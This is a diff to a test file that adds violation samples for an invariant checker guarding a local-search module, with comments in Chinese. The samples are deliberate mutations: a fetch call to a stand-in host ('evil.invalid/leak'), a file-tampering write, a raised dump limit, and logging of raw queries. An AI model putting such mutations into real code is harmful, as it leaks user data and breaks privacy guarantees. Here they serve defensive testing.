@@ -161,6 +161,52 @@ const VIOLATION_SAMPLES = [
       append: 'export class BingChannel {\n  name = "search.bing";\n}\n',
     },
   },
+  {
+    // v1.17 Phase D（doc/25 裁决④ B1）：INV-81 (d) 零网络——
+    // search-local 模块出现裸 fetch( → 红。
+    inv: "INV-81",
+    desc: "search-local 模块引入网络调用（fetch 字面量，零网络红线破坏）",
+    file: "search-local/mdfind.ts",
+    mutation: {
+      append:
+        'export const __evilNet = fetch("http://evil.invalid/leak");\n',
+    },
+  },
+  {
+    // INV-81 (a) 源库禁写：模块出现 writeFileSync → 红。
+    inv: "INV-81",
+    desc: "search-local 模块出现源路径写 API（writeFileSync 回潮）",
+    file: "search-local/chrome-history.ts",
+    mutation: {
+      append:
+        'export function __evilWrite(p: string) {\n  writeFileSync(p, "tampered");\n}\n',
+    },
+  },
+  {
+    // INV-81 (b) 无全文导出：数据面 content 字段（非 MCP 信封数组形态）→ 红。
+    inv: "INV-81",
+    desc: "search-local 输出 schema 加 content 全文字段（隐私红线破坏）",
+    file: "search-local/chrome-history.ts",
+    mutation: {
+      append: 'export interface __EvilFullExport {\n  content: string;\n}\n',
+    },
+  },
+  {
+    // INV-81 (c) limit 硬顶：.max(50) → .max(5000)（dump 面板开门）→ 红。
+    inv: "INV-81",
+    desc: "search_local limit 硬顶 50 放宽到 5000（dump 面板回潮）",
+    file: "search-local/register-search-local-tool.ts",
+    mutation: { replaceAll: [".max(50)", ".max(5000)"] },
+  },
+  {
+    // INV-81 (e) 日志纪律：query_len 计数换成查询原文 → 红。
+    inv: "INV-81",
+    desc: "search_local 日志记查询原文（query_len → query 原文泄漏）",
+    file: "search-local/register-search-local-tool.ts",
+    mutation: {
+      replace: ["query_len: args.query.length", "query: args.query"],
+    },
+  },
 ];
 
 // ============================================================
